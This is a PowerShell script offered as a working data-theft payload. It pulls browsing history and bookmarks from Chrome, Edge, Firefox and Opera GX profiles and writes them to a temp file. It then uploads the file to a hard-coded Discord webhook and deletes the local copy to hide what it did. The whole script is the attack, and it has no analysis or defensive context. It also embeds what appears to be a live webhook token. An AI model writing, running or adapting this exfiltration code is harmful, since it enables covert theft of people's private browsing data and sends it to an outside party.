# Set the Discord webhook URL
$dc = "https://discord.com/api/webhooks/1312719703080177757/6_n-f2jRWn4FPwEXxyAajPo8WXlMfvbSwzsgZ856oygu-l54BbXANRi40_xJ93rZKJsa"

function Get-BrowserData {

    [CmdletBinding()]
    param (	
        [Parameter (Position=1,Mandatory = $True)]
        [string]$Browser,    
        [Parameter (Position=2,Mandatory = $True)]
        [string]$DataType 
    ) 

    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

    if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"}
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"}
    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"}
    elseif ($Browser -eq 'opera'   -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"}

    $Value = Get-Content -Path $Path | Select-String -AllMatches $Regex | % {($_.Matches).Value} | Sort -Unique
    $Value | ForEach-Object {
        $Key = $_
        if ($Key -match $Search) {
            New-Object -TypeName PSObject -Property @{
                User = $env:UserName
                Browser = $Browser
                DataType = $DataType
                Data = $_
            }
        }
    } 
}

Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\--BrowserData.txt
Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\--BrowserData.txt
Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP--BrowserData.txt
Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\--BrowserData.txt
Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\--BrowserData.txt
Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt

#------------------------------------------------------------------------------------------------------------------------------------

function Upload-Discord {

    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$file,
        [parameter(Position=1, Mandatory=$False)]
        [string]$text 
    )

    $hookurl = "$dc"

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($file))) {
        curl.exe -F "file1=@$file" $hookurl
    }
}

if (-not ([string]::IsNullOrEmpty($dc))) { 
    Upload-Discord -file $env:TMP\--BrowserData.txt
}

############################################################################################################################################################
RI $env:TEMP\--BrowserData.txt
